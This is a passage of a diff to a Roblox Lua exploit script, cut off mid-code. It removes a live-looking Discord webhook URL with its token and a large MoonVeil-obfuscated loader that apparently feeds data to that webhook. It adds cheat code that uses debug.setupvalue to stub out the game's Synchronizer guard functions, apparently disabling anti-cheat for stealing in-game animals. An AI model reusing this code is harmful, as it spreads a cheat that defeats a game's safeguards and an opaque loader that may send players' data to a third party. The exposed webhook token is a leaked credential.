@@ -1,17 +1,12052 @@
-local Webhook = "https://discord.com/api/webhooks/1436434636841422871/kpskRTfPfW0btfsBEVb65kFU2hiuQ8byE6RB0gzgxl7AcOrsZeoHlqK6YV0V6pW8Vq7l"
+if not game:IsLoaded() then game.Loaded:Wait() end
+pcall(function() game:GetService("Players").RespawnTime = 0 end)
+pcall(function() if setfpscap then setfpscap(9999) end end)
 
-getgenv().UserPingThreshold = 50000000
+local SharedState = {
+    ConveyorAnimals = {},
+    BestConveyorGv = -1,
+    SelectedPetData = nil,
+    AllAnimalsCache = nil,
+    DisableStealSpeed = nil,
+    ListNeedsRedraw = true,
+    AdminButtonCache = {},
+    StealSpeedToggleFunc = nil,
+    BalloonedPlayers = {},
+    PetPreviewModelCache = {},
+    MobileScaleObjects = {},
+}
 
+do
 
--- =================================================================================
---      SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE
--- =================================================================================
+    local Sync = require(game.ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Synchronizer"))
 
-if Webhook and Webhook:match("discord.com/api/webhooks") then
-    getgenv().UserWebhookURL = Webhook
-else
-    return
+    for name, fn in pairs(Sync) do
+        if typeof(fn) ~= "function" then continue end
+        if isexecutorclosure(fn) then continue end
+
+        local ok, ups = pcall(debug.getupvalues, fn)
+        if not ok then continue end
+
+        for idx, val in pairs(ups) do
+            if typeof(val) == "function" and not isexecutorclosure(val) then
+                local ok2, innerUps = pcall(debug.getupvalues, val)
+                if ok2 then
+                    local hasBoolean = false
+                    for _, v in pairs(innerUps) do
+                        if typeof(v) == "boolean" then
+                            hasBoolean = true
+                            break
+                        end
+                    end
+                    if hasBoolean then
+                        debug.setupvalue(fn, idx, newcclosure(function() end))
+                    end
+                end
+            end
+        end
+    end
 end
 
--- This script was generated using the MoonVeil Obfuscator v1.4.5 [https://moonveil.cc]
-local hb,Jb,bc,wb,qf,S=type,getmetatable,bit32.bxor,pairs local q,c,pa,F,ha,cf,qd,ea,W,nb,pb,_c,L,Af,Sd,Vd,eb,Re,Zb,dd,me,y,xa,M,md,Qf,Qe,Ze,gb,Dd,ja,Fa,Ma,xe,Mf,lb,lc,Bc,Kd,Y,Lf,H,Tb,td;Dd=(getfenv());cf,c,td=(string.char),(string.byte),(bit32 .bxor);md=function(_d,Nd)local Rf,Sb,Gf,g,nf,Ue,P,ua;Gf,Sb={},function(Oa,He,Tc)Gf[Tc]=bc(He,1866)-bc(Oa,26259)return Gf[Tc]end;nf=Gf[-19083]or Sb(11988,23780,-19083)while nf~=4160 do if nf<42201 then if nf>=8083 then if nf>8083 then return Rf else P=P+g;Ue=P if P~=P then nf=Gf[7619]or Sb(55987,58464,7619)else nf=Gf[3472]or Sb(8292,73712,3472)end end else Rf='';P,ua,nf,g=67,(#_d-1)+67,Gf[7446]or Sb(62530,78048,7446),1 end elseif nf>=53699 then if nf>53699 then nf,Rf=Gf[-23751]or Sb(33825,66831,-23751),Rf..cf(td(c(_d,(Ue-67)+1),c(Nd,(Ue-67)%#Nd+1)))else if(g>=0 and P>ua)or((g<0 or g~=g)and P<ua)then nf=9994 else nf=59381 end end else Ue=P if ua~=ua then nf=9994 else nf=Gf[-26988]or Sb(23283,67945,-26988)end end end end;qd=(select);W=(function(...)return{[1]={...},[2]=qd('#',...)}end);ea=((function()local function kc(Ja,ab,tc)if ab>tc then return end return Ja[ab],kc(Ja,ab+1,tc)end return kc end)());M,Lf=(string.gsub),(string.char);H=(function(Gc)Gc=M(Gc,'[^ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=]','')return(Gc:gsub('.',function(ia)if(ia=='=')then return''end local Te,Ld='',(('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'):find(ia)-1)for V=6,1,-1 do Te=Te..(Ld%2^V-Ld%2^(V-1)>0 and'1'or'0')end return Te end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(Jd)if(#Jd~=8)then return''end local Df=0 for ra=1,8 do Df=Df+(Jd:sub(ra,ra)=='1'and 2^(8-ra)or 0)end return Lf(Df)end))end);nb,ja,Fa,F,_c,xa,Vd,ha=Dd[md('\252\138\235\230\144\254','\143\254\153')][md('C\156\28W\145\a','6\242l')],Dd[md('>\159N$\133[','M\235<')][md('\202\204\219','\185')],Dd[md('\164\234P\190\240E','\215\158\"')][md('\133\223\147\195','\231\166')],Dd[md('D\244R\174\20','&\157')][md('Y\164\242\\\177\238','5\215\154')],Dd[md('\235\b\253R\187','\137a')][md('\190\182\185\165\163\165','\204\197\209')],Dd[md('\175\26\185@\255','\205s')][md('G\184K\189','%\217')],Dd[md('\n\224\28\237\27','~\129')][md('\30\231m\30\233w','}\136\3')],{};Qe=(function(La)local cc=ha[La]if cc then return cc end local Va,le,Pa,f_,gc=F(1,11),F(1,5),1,{},''while Pa<=#La do local Sc=Fa(La,Pa);Pa=Pa+1 for pf=122,(8)+121 do local Ae=nil if xa(Sc,1)~=0 then if Pa<=#La then Ae=ja(La,Pa,Pa);Pa=Pa+1 end else if Pa+1<=#La then local Eb=nb(md('\240\135\252','\206'),La,Pa);Pa=Pa+2 local Pf,Uc=#gc-_c(Eb,5),xa(Eb,(le-1))+3;Ae=ja(gc,Pf,Pf+Uc-1)end end Sc=_c(Sc,1)if not(Ae)then else f_[#f_+1]=Ae;gc=ja(gc..Ae,-Va)end end end local Wc=Vd(f_);ha[La]=Wc return Wc end);pb=(function()local Cb,ld,dc,Ua,qb,ib,Of,If,Le,zc,R,Td=Dd[md('N\235X\177\30',',\130')][md('\141\205\128\199','\239\181')],Dd[md('SpE*\3','1\25')][md('\171\237\167\232','\201\140')],Dd[md('\30\49\bkN','|X')][md('\180\185\164','\214')],Dd[md('\237\3\251Y\189','\143j')][md('R=\149W(\137','>N\253')],Dd[md('\214\218\192\128\134','\180\179')][md('\166\168\213\189\189\201','\212\219\189')],Dd[md('\213x\142\207b\155','\166\f\252')][md('SUB',' ')],Dd[md('\169\15P\179\21E','\218{\"')][md('\25\17\n\27','ip')],Dd[md(',@\29\54Z\b','_4o')][md('\141;@\153\54[','\248U0')],Dd[md('\4\\B\30FW','w(0')][md('dsf','\22')],Dd[md('A\138W\135P','5\235')][md('\185@\170J','\201!')],Dd[md('\28\128\n\141\r','h\225')][md('\254\138\159\234\135\132','\139\228\239')],Dd[md('4u\"x%','@\20')][md('\19\234t\31\246s','z\132\a')]local function wf(I,oe,Rb,Xe,jb)local be,qa,Rd,Ec=I[oe],I[Rb],I[Xe],I[jb]local pd;be=ld(be+qa,4294967295);pd=Cb(Ec,be);Ec=ld(dc(Ua(pd,16),qb(pd,16)),4294967295);Rd=ld(Rd+Ec,4294967295);pd=Cb(qa,Rd);qa=ld(dc(Ua(pd,12),qb(pd,20)),4294967295);be=ld(be+qa,4294967295);pd=Cb(Ec,be);Ec=ld(dc(Ua(pd,8),qb(pd,24)),4294967295);Rd=ld(Rd+Ec,4294967295);pd=Cb(qa,Rd);qa=ld(dc(Ua(pd,7),qb(pd,25)),4294967295);I[oe],I[Rb],I[Xe],I[jb]=be,qa,Rd,Ec return I end local ee,rd={0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}local ad=function(Yd,Wd,J)ee[1],ee[2],ee[3],ee[4]=3870074228,3760440017,1655059840,3864764065 for tf=215,(8)+214 do ee[(tf-214)+4]=Yd[(tf-214)]end ee[13]=Wd for rc=87,(3)+86 do ee[(rc-86)+13]=J[(rc-86)]end for Vb=235,(16)+234 do rd[(Vb-234)]=ee[(Vb-234)]end for Na=224,(10)+223 do wf(rd,1,5,9,13);wf(rd,2,6,10,14);wf(rd,3,7,11,15);wf(rd,4,8,12,16);wf(rd,1,6,11,16);wf(rd,2,7,12,13);wf(rd,3,8,9,14);wf(rd,4,5,10,15)end for zf=55,(16)+54 do ee[(zf-54)]=ld(ee[(zf-54)]+rd[(zf-54)],4294967295)end return ee end local function Yb(U,Ge,Kc,Qa,gd)local ta=#Qa-gd+1 if not(ta<64)then else local ma=ib(Qa,gd);Qa=ma..Le(md('9','9'),64-ta);gd=1 end Dd[md(':\192L>\193K','[\179?')](#Qa>=64)local aa,D=zc(If(md('\151\27rn\189\152\n\252\50a\161\232\171\179\178\163\159\27rn\189\152\n\252\50a\161\232\171\179\178\163\159',"\171RF\'\137\209>\181\6(\149\161\159\250\134\234"),Qa,gd)),ad(U,Ge,Kc)for ze=54,(16)+53 do aa[(ze-53)]=Cb(aa[(ze-53)],D[(ze-53)])end local Id=Of(md('\156\245l\20\243\151\252M\157\208\200E\241e\26\v\148\245l\20\243\151\252M\157\208\200E\241e\26\v\148','\160\188X]\199\222\200\4\169\153\252\f\197,.B'),R(aa))if not(ta<64)then else Id=ib(Id,1,ta)end return Id end local function Ed(zb)local fc=''for Qc=79,(#zb)+78 do fc=fc..zb[(Qc-78)]end return fc end local function x(hc,Xc,uc,Ya)local if_,Yc,nd,vb=zc(If(md('k\27 \15\154JD.c\27 \15\154JD.c','WR\20F\174\3pg'),hc)),zc(If(md('.\30\239[c\146&','\18W\219'),uc)),{},1 while vb<=#Ya do Td(nd,Yb(if_,Xc,Yc,Ya,vb));vb=vb+64;Xc=Xc+1 end return Ed(nd)end return function(Vc,ec,X)return x(X,0,ec,Vc)end end)();xe=(function()local jf,nc,Ia,Oe,Gd,sf,K,bf,od,Hb,Ce=Dd[md('\163\129\181\219\243','\193\232')][md(']fP|','?\b')],Dd[md('I|_&\25','+\21')][md('ZdWn','8\28')],Dd[md('\137\145\159\203\217','\235\248')][md('\187I\5\160\\\25','\201:m')],Dd[md('\192r\214(\144','\162\27')][md('\254>X\251+D','\146M0')],Dd[md('\241\250\231\160\161','\147\147')][md('\\\146P\151','>\243')],Dd[md('\172\237\186\183\252','\206\132')][md('YTI',';')],Dd[md('\136\96\158m\153','\252\1')][md('X\30\175T\2\168','1p\220')],Dd[md('>\183(\186/','J\214')][md('\209sr\197~i','\164\29\2')],Dd[md('T\211\233N\201\252',"\'\167\155")][md('\213\194\215','\167')],Dd[md('\229\v\246\255\17\227','\150\127\132')][md('\143\185\141\163','\236\209')],Dd[md('\234)G\240\51R','\153]5')][md('\16\198\6\218','r\191')]local function Ke(ga,Be)local De,Xa=Ia(ga,Be),Oe(ga,32-Be)return Gd(sf(De,Xa),4294967295)end local Za=function(te)local Ca={1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298}local function ve(Aa)local Qd=#Aa local Wb=Qd*8;Aa=Aa..md('\28','\156')local ff=64-((Qd+9)%64)if not(ff~=64)then else Aa=Aa..od(md('\229','\229'),ff)end Aa=Aa..Hb(Gd(Ia(Wb,56),255),Gd(Ia(Wb,48),255),Gd(Ia(Wb,40),255),Gd(Ia(Wb,32),255),Gd(Ia(Wb,24),255),Gd(Ia(Wb,16),255),Gd(Ia(Wb,8),255),Gd(Wb,255))return Aa end local function E(Pc)local cd={}for O=14,(#Pc)+13,64 do K(cd,Pc[md('wqf','\4')](Pc,(O-13),(O-13)+63))end return cd end local function i_(Ra,je)local Hf={}for he=86,(64)+85 do if(he-85)<=16 then Hf[(he-85)]=sf(Oe(Ce(Ra,((he-85)-1)*4+1),24),Oe(Ce(Ra,((he-85)-1)*4+2),16),Oe(Ce(Ra,((he-85)-1)*4+3),8),Ce(Ra,((he-85)-1)*4+4))else local wa,ya=nc(Ke(Hf[(he-85)-15],7),Ke(Hf[(he-85)-15],18),Ia(Hf[(he-85)-15],3)),nc(Ke(Hf[(he-85)-2],17),Ke(Hf[(he-85)-2],19),Ia(Hf[(he-85)-2],10));Hf[(he-85)]=Gd(Hf[(he-85)-16]+wa+Hf[(he-85)-7]+ya,4294967295)end end local ae,yd,xd,ye,Ob,uf,Bd,B=bf(je)for ef=40,(64)+39 do local sd,vf=nc(Ke(Ob,6),Ke(Ob,11),Ke(Ob,25)),nc(Gd(Ob,uf),Gd(jf(Ob),Bd))local cb,vc,Ff=Gd(B+sd+vf+Ca[(ef-39)]+Hf[(ef-39)],4294967295),nc(Ke(ae,2),Ke(ae,13),Ke(ae,22)),nc(Gd(ae,yd),Gd(ae,xd),Gd(yd,xd))local ke=Gd(vc+Ff,4294967295);B=Bd;Bd=uf;uf=Ob;Ob=Gd(ye+cb,4294967295);ye=xd;xd=yd;yd=ae;ae=Gd(cb+ke,4294967295)end return Gd(je[1]+ae,4294967295),Gd(je[2]+yd,4294967295),Gd(je[3]+xd,4294967295),Gd(je[4]+ye,4294967295),Gd(je[5]+Ob,4294967295),Gd(je[6]+uf,4294967295),Gd(je[7]+Bd,4294967295),Gd(je[8]+B,4294967295)end te=ve(te)local Cc,n_,qe=E(te),{1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225},''for G,Jf in Dd[md('jZpjXb','\3*\17')](Cc)do n_={i_(Jf,n_)}end for Nc,Lc in Dd[md('\159Uh\159Wz','\246%\t')](n_)do qe=qe..Hb(Gd(Ia(Lc,24),255));qe=qe..Hb(Gd(Ia(Lc,16),255));qe=qe..Hb(Gd(Ia(Lc,8),255));qe=qe..Hb(Gd(Lc,255))end return qe end return Za end)()local ie,v,Cf,ka,df,l_,Fb,Ic,Db,Ne,Pe,Hc,da,jc,pc,p,j,Ee,wd,Xd,ub,Rc,ne,vd,r_,Dc,Bf,ba,Ve,fa_=Dd[md('\229\217\225\197','\145\160')],Dd[md(']QL^A','-2')],Dd[md('\2\20\21\t\21','gf')],Dd[md('\129\181\217v\152\184\210q','\245\218\183\3')],Dd[md('-\150\v)\151\f','L\229x')],Dd[md('\247\198\135\225\192\159','\132\163\235')],Dd[md('\186\0\196\129\213c\168\17\209\142\220r','\201e\176\236\176\23')],Dd[md('Q})Kg<','\"\t[')][md('\20\f\238\31\2\232','rc\156')],Dd[md('\218\4}\192\30h','\169p\15')][md('\138\187f\158\182}','\255\213\22')],Dd[md('\183\138=\173\144(','\196\254O')][md("\'!6",'T')],Dd[md('\147n\b\137t\29','\224\26z')][md('\249=\239!','\155D')],Dd[md(')\145/3\139:','Z\229]')][md('\28\143\30\149','\127\231')],Dd[md('\169\184\191\181\184','\221\217')][md('\151%\140/','\250J')],Dd[md('\237\240\251\253\252','\153\145')][md('\175\243\188\249','\223\146')],Dd[md('?\191)\178.','K\222')][md('M\181iO\179i','.\199\f')],Dd[md('\207\4\217\t\222','\187e')][md(']\131\187Q\159\188','4\237\200')],Dd[md('^gHjO','*\6')][md('\185T\230\185Z\252','\218;\136')],Dd[md(';\232>>-\243%?=','X\135LQ')][md('\31\170\6\29\172\6','|\216c')],Dd[md('\255\235!E\233\240:D\249','\156\132S*')][md('\20r\bw\t','m\27')],Dd[md('\96u\16Kvn\vJf','\3\26b$')][md('w\241\199p\249\209','\5\148\180')],Dd[md('\179\184x\173\165\163c\172\181','\208\215\n\194')][md('3\195?\220\53','P\175')],Dd[md('!Q\17 Q\v\48','F4e')],Dd[md('h\166~\252\56','\n\207')][md('&+6','D')],Dd[md('\175\162\185\248\255','\205\203')][md('^\180S\190','<\204')],Dd[md('\139\210\157\136\219','\233\187')][md(':\243\54\246','X\146')],Dd[md('\191\255\169\165\239','\221\150')][md('\26\4\29\3\f','xp')],Dd[md('\254\1\232[\174','\156h')][md('g\216\180|\205\168','\21\171\220')],Dd[md('\133\145\147\203\213','\231\248')][md('\128\174#\133\187?','\236\221K')],Dd[md('\135\219\145\129\215','\229\178')][md('\19\135\186\4\158\173\2','v\255\206')],{[1144]={},[25420]={},[8253]={{10,8,false},{8,5,true},{10,5,true},{7,3,true},{5,2,false},{2,8,false},{8,3,false},{10,7,false},{10,7,false},{8,7,true},{8,7,false},{6,3,false},{8,4,false},{6,6,true},{7,8,true},{7,4,true},{10,5,true},{5,7,false},{6,8,true},{6,7,true},{2,5,false},{10,3,false},{7,5,false},{2,6,false},{7,5,false},{10,7,false},{10,7,false},{5,5,false},{2,2,true},{10,8,false},{10,0,true},{2,0,true},{10,7,false},{2,8,true},{10,7,false},{2,2,true},{8,7,true},{7,0,false},{8,3,true},{6,8,true},{10,2,true},{8,7,false},{7,2,true},{8,7,false},{8,1,true},{8,5,true},{6,1,false},{6,1,true},{10,7,false},{5,7,false},{10,2,false},{7,3,true},{8,7,false},{2,0,false},{5,1,true},{6,7,true},{8,2,true},{2,6,false},{10,5,true},{2,6,true},{10,2,false},{8,7,false},{7,10,false},{8,3,true},{7,4,true},{5,1,false},{5,0,false},{7,7,false},{7,7,false},{8,7,false},{10,8,true},{2,0,false},{8,0,false},{7,1,true},{8,7,true},{8,6,false},{8,7,true},{10,7,false},{6,4,false},{10,5,true},{8,7,false},{2,8,false},{10,5,true},{6,5,false},{10,4,true},{8,8,false},{10,7,false},{8,4,true},{10,7,true},{7,8,false},{5,6,true},{10,5,true},{10,3,false},{6,3,false},{8,7,false},{8,1,true},{10,5,true},{5,2,true},{6,4,false},{6,4,true},{6,1,true},{10,7,false},{10,8,false},{8,3,false},{6,8,false},{2,1,true},{10,0,false},{8,2,true},{7,3,false},{5,6,true},{10,7,false},{6,5,false},{2,7,false},{10,7,false},{5,3,false},{10,3,false},{10,7,false},{10,3,false},{5,4,true},{10,8,false},{10,7,false},{8,7,true},{10,7,false},{7,5,true},{10,7,false},{2,2,false},{8,5,true},{7,6,true},{7,5,true},{7,6,true},{10,7,true},{8,0,false},{10,7,false},{7,6,true},{10,5,false},{8,2,false},{8,2,false},{10,8,false},{10,9,false},{6,7,true},{8,6,true},{7,3,false},{7,3,false},{8,1,false},{5,8,true},{10,9,false},{10,2,false},{8,8,false},{10,7,true},{8,7,false},{7,2,true},{10,3,false},{6,0,false},{8,2,true},{5,3,false},{5,3,true},{6,1,false},{7,0,true},{6,1,true},{5,8,false},{8,3,false},{8,6,true},{2,6,false},{5,7,true},{10,7,false},{8,7,true},{7,4,true},{10,7,false},{10,7,false},{8,3,true},{10,7,false},{10,6,false},{10,7,false},{10,7,false},{7,6,true},{2,8,false},{10,3,false},{6,0,true},{8,5,true},{7,1,false},{10,6,false},{2,3,false},{8,4,false},{7,8,false},{10,5,true},{5,7,false},{10,3,false},{8,4,false},{7,7,false},{8,6,false},{2,3,false},{6,0,true},{5,7,false},{7,3,true},{6,5,true},{7,2,false},{10,7,false},{2,4,false},{5,3,true},{5,2,false},{2,4,true},{8,0,false},{10,7,false},{7,0,false},{7,8,true},{8,6,false},{10,1,false},{10,3,false},{7,7,true},{10,7,false},{10,7,false},{2,2,true},{8,7,true},{7,8,false},{2,7,false},{8,7,false},{5,1,true},{10,7,false},{10,7,false},{7,7,false},{5,7,false},{7,3,true},{5,7,false},{5,5,true},{8,7,true},{8,7,false},{6,5,true},{8,7,false},{10,7,false},{8,1,false},{8,6,false},{10,7,false},{7,7,false},{10,1,true},{10,5,false},{6,2,false},{8,7,false},{8,0,false},{7,7,true},{6,1,true},{10,7,false},{7,4,true},{8,2,false},{5,5,false},{6,4,true},{10,3,false},{5,8,true},{5,0,false},{10,7,false},{10,4,true},{2,4,true},{10,8,false},{5,6,true},{8,1,true},{7,6,false},{8,7,false}}}local fb=(function(ue)local hd=fa_[1144][ue]if(hd)then return hd end local Ef=1 local function na()local Ha,Se,t_,ed,Mc,_a,rf,yb,bd,u_,w_,Je,qc,oa,Bb,kb,m,re_,Gb,Zc,Pb,yc,Ud,sa,Me,bb,Nf,ud,Ea,sc,wc,Ba;bb,Ba=function(s_,Q,Da)Ba[Q]=bc(Da,4117)-bc(s_,50146)return Ba[Q]end,{};Nf=Ba[-19728]or bb(61688,-19728,53335)while Nf~=2152 do if Nf<34046 then if Nf>=14293 then if Nf<22237 then if Nf>20039 then if Nf>=21569 then if Nf<=21739 then if Nf>=21581 then if Nf>21581 then m[55530],Nf=Se[m[2748]+1],Ba[31197]or bb(15725,31197,130407)else yb=Me if rf~=rf then Nf=Ba[12210]or bb(56273,12210,30200)else Nf=Ba[31634]or bb(46244,31634,26726)end end else bd=kb if Bb~=Bb then Nf=28428 else Nf=Ba[9634]or bb(19221,9634,80288)end end else if(Gb==3)then Nf=Ba[30942]or bb(46069,30942,70882)continue else Nf=Ba[-24258]or bb(14378,-24258,129726)continue end Nf=Ba[31491]or bb(14373,31491,129727)end elseif Nf<=20417 then if Nf<20312 then Zc=bd if wc~=wc then Nf=55225 else Nf=Ba[-15295]or bb(49898,-15295,53483)end elseif Nf<=20312 then Me,Nf=vd(rf,-1570667790),Ba[27232]or bb(55908,27232,56496)continue else Pb=Se if bd~=bd then Nf=Ba[-23232]or bb(23342,-23232,77906)else Nf=Ba[-12371]or bb(21928,-12371,35141)end end else Nf=Ba[11218]or bb(38473,11218,52467)continue end elseif Nf>=17133 then if Nf>=19244 then if Nf>19898 then Nf,u_=Ba[17611]or bb(65439,17611,32244),ea(Gb[1],1,Gb[2])elseif Nf>19244 then Nf,t_=14726,vd(re_,-1399206177)continue else kb=kb+Se;bd=kb if kb~=kb then Nf=28428 else Nf=Ba[-19192]or bb(26303,-19192,87566)end end elseif Nf<=17133 then if(m>=0 and Pb>Zc)or((m<0 or m~=m)and Pb<Zc)then Nf=Ba[4067]or bb(56204,4067,65496)else Nf=Ba[-32050]or bb(21154,-32050,88814)end else Pb,Nf=vd(Zc,-1570667790),Ba[26785]or bb(21260,26785,47569)continue end elseif Nf>=15498 then if Nf>15498 then qc=Db(md('\227','\161'),ue,Ef);Nf,Ef=23053,Ef+1 else Bb=Ha if sc~=sc then Nf=Ba[7211]or bb(12533,7211,92743)else Nf=Ba[29828]or bb(34553,29828,29032)end end elseif Nf>14293 then re_=t_ if re_==0 then Nf=Ba[1815]or bb(14909,1815,80226)continue else Nf=Ba[2657]or bb(25653,2657,52851)continue end Nf=Ba[22225]or bb(23416,22225,97037)else Gb=u_;wc=ne(wc,ba(r_(Gb,127),(ud-29)*7))if(not Dc(Gb,128))then Nf=Ba[834]or bb(54509,834,35864)continue else Nf=Ba[-27261]or bb(3869,-27261,119062)continue end Nf=Ba[3542]or bb(50282,3542,60313)end elseif Nf<=26034 then if Nf<24532 then if Nf>23053 then if Nf>23513 then m[55530],Nf=Se[m[53792]+1],Ba[-7153]or bb(24998,-7153,98610)else if(ud>=0 and Zc>m)or((ud<0 or ud~=ud)and Zc<m)then Nf=Ba[-13636]or bb(38968,-13636,53657)else Nf=Ba[-13334]or bb(15216,-13334,121213)end end elseif Nf>22854 then Nf,Mc=Ba[-27161]or bb(38366,-27161,76848),vd(qc,249)continue elseif Nf>22237 then Nf,Gb=50860,nil else Bb=0;wc,Se,bd,Nf=1,132,136,Ba[-26655]or bb(55057,-26655,29857)end elseif Nf<=24879 then if Nf>=24570 then if Nf>24570 then m[55530],Nf=Ve(m[2748],0,16),Ba[21145]or bb(45974,21145,85826)else rf=Db(md('\4q\f','8'),ue,Ef);Nf,Ef=Ba[-23059]or bb(40979,-23059,41820),Ef+4 end else m[55530],Nf=Se[m[59147]+1],Ba[-9276]or bb(23616,-9276,106128)end elseif Nf>25918 then return{[24260]='',[5449]=Pb,[11490]=qc,[50097]=Ud,[12622]=Ha,[52049]=sa}else Me=Me+oa;yb=Me if Me~=Me then Nf=Ba[1935]or bb(48973,1935,55932)else Nf=301 end end elseif Nf>29444 then if Nf>30262 then ud=Db(md('s','1'),ue,Ef);Nf,Ef=35258,Ef+1 elseif Nf>29890 then Nf,u_=Ba[-23295]or bb(27256,-23295,51947),Gb else yc=0;kb,Nf,Ha,sc=1,15498,57,61 end elseif Nf<=27146 then if Nf<26817 then Nf,_a=8844,nil elseif Nf>26817 then bd=Se;yc=ne(yc,ba(r_(bd,127),(Bb-57)*7))if not Dc(bd,128)then Nf=Ba[26101]or bb(1251,26101,67328)continue end Nf=Ba[-826]or bb(60690,-826,23978)else Nf,wc=Ba[-7389]or bb(465,-7389,62598),nil end elseif Nf<=28428 then kb,Nf=nil,22237 else Nf,w_=Ba[26815]or bb(60007,26815,53380),vd(Ud,249)continue end elseif Nf<8014 then if Nf<=4352 then if Nf<=1933 then if Nf<889 then if Nf>301 then if(wc>=0 and Se>bd)or((wc<0 or wc~=wc)and Se<bd)then Nf=Ba[-8745]or bb(55709,-8745,45551)else Nf=9868 end else if(oa>=0 and Me>rf)or((oa<0 or oa~=oa)and Me<rf)then Nf=Ba[-25065]or bb(64673,-25065,40168)else Nf=26576 end end elseif Nf<994 then ud=Pb if Zc~=Zc then Nf=Ba[21526]or bb(33075,21526,68133)else Nf=17133 end elseif Nf>994 then if(ud==1)then Nf=Ba[-3953]or bb(47212,-3953,69314)continue else Nf=Ba[-8256]or bb(37689,-8256,24636)continue end Nf=Ba[-1365]or bb(39672,-1365,88040)else oa=re_ if Me~=Me then Nf=Ba[12022]or bb(16478,12022,45801)else Nf=Ba[-13153]or bb(14069,-13153,106502)end end elseif Nf>3973 then sa=Db(md('@','\2'),ue,Ef);Nf,Ef=Ba[4140]or bb(19925,4140,53755),Ef+1 elseif Nf>2617 then ud=m if(ud==0)then Nf=Ba[17766]or bb(45087,17766,80482)continue else Nf=Ba[4633]or bb(55401,4633,45184)continue end Nf=Ba[2742]or bb(363,2742,58360)elseif Nf<=2222 then Me,Nf=nil,Ba[-10723]or bb(31216,-10723,68121)else m=Ha[(Zc-27)];ud=m[52369]if(ud==4)then Nf=Ba[-7502]or bb(10622,-7502,89054)continue else Nf=Ba[12870]or bb(19794,12870,81324)continue end Nf=Ba[14772]or bb(2752,14772,108560)end elseif Nf>=7169 then if Nf>7887 then Gb,Nf=W(vd(t_,-1399206177)),Ba[6435]or bb(26782,6435,59862)continue elseif Nf>7266 then Ha=Ha+kb;Bb=Ha if Ha~=Ha then Nf=Ba[11576]or bb(945,11576,87963)else Nf=7266 end elseif Nf>7169 then if(kb>=0 and Ha>sc)or((kb<0 or kb~=kb)and Ha<sc)then Nf=Ba[5279]or bb(63171,5279,44105)else Nf=Ba[-20658]or bb(47510,-20658,90509)end else wc,Nf=t_,Ba[-23264]or bb(23999,-23264,106480)continue end elseif Nf<=6358 then if Nf<=5464 then if Nf<=5266 then Nf,u_=Ba[-147]or bb(54017,-147,21074),ea(Gb[1],1,Gb[2])else if(Pb>=0 and bd>wc)or((Pb<0 or Pb~=Pb)and bd<wc)then Nf=Ba[18113]or bb(29175,18113,98644)else Nf=56903 end end else Zc=Pb;m=r_(Zc,255);ud=fa_[8253][m+1];u_,Gb,t_=ud[1],ud[2],ud[3];re_={[4910]=0,[52369]=Gb,[20286]=0,[37631]=0,[2748]=0,[47620]=0,[31900]=0,[55530]=0,[11057]=0,[59147]=0,[53792]=0,[16270]=0,[49643]=0,[53986]=nil,[43372]=m};p(Ha,re_)if u_==7 then Nf=Ba[12756]or bb(29345,12756,102057)continue elseif(u_==10)then Nf=Ba[-2023]or bb(21800,-2023,76921)continue else Nf=Ba[-20400]or bb(44541,-20400,85061)continue end Nf=Ba[-5652]or bb(53767,-5652,50356)end else rf=Db(md('\131','\224')..re_,ue,Ef);Nf,Ef=Ba[-11170]or bb(10128,-11170,92338),Ef+re_ end elseif Nf<10838 then if Nf>9362 then if Nf<=9868 then if Nf>9661 then Zc,Nf=nil,Ba[983]or bb(39216,983,81812)else Gb,Nf=t_,Ba[14196]or bb(57560,14196,35173)continue end else re_[59147]=r_(Bf(Zc,8),255);Me=r_(Bf(Zc,16),65535);re_[11057]=Me;rf=nil;rf=if Me<32768 then Me else Me-65536;re_[16270],Nf=rf,Ba[63]or bb(17906,63,88281)end elseif Nf>8844 then if Nf<=9140 then wc=0;Nf,Zc,Pb,m=889,33,29,1 else Nf,m[55530]=Ba[-27953]or bb(24556,-27953,105188),Se[m[47620]+1]end elseif Nf<=8800 then if Nf>8014 then Pb,Nf=nil,60620 else if ud==3 then Nf=Ba[-4132]or bb(6372,-4132,61325)continue elseif(ud==5)then Nf=Ba[1264]or bb(416,1264,67384)continue else Nf=Ba[-16916]or bb(41925,-16916,84876)continue end Nf=Ba[-4021]or bb(24113,-4021,105635)end else Ea=Db(md('L','\14'),ue,Ef);Nf,Ef=58170,Ef+1 end elseif Nf<13239 then if Nf<12184 then if Nf>10838 then u_=Zc if m~=m then Nf=Ba[15380]or bb(30521,15380,68248)else Nf=23513 end else yb,Nf=nil,Ba[-11909]or bb(33273,-11909,53225)end elseif Nf<=12184 then Gb,Nf=W'',5266 continue else Nf,Se[(Zc-113)]=Ba[32333]or bb(45161,32333,70423),u_ end elseif Nf>14108 then if Nf<=14171 then if(ud==8)then Nf=Ba[-27441]or bb(63477,-27441,72000)continue else Nf=Ba[-10096]or bb(19037,-10096,33113)continue end Nf=Ba[-6613]or bb(3677,-6613,109751)else Nf,yb=59672,vd(_a,249)continue end elseif Nf<=13967 then if Nf<=13239 then Nf,ed=62770,vd(sa,249)continue else Me,Nf=nil,6686 end else m=Zc;Bb=ne(Bb,ba(r_(m,127),(Pb-132)*7))if(not Dc(m,128))then Nf=Ba[12878]or bb(46078,12878,98066)continue else Nf=Ba[-19113]or bb(50747,-19113,63368)continue end Nf=Ba[23283]or bb(21943,23283,92172)end elseif Nf<52060 then if Nf>41150 then if Nf<46759 then if Nf>44820 then if Nf<=45855 then if Nf<=45775 then yc=Je;Ha,sc=pc(yc),false;kb,Se,Nf,Bb=252,1,Ba[-19135]or 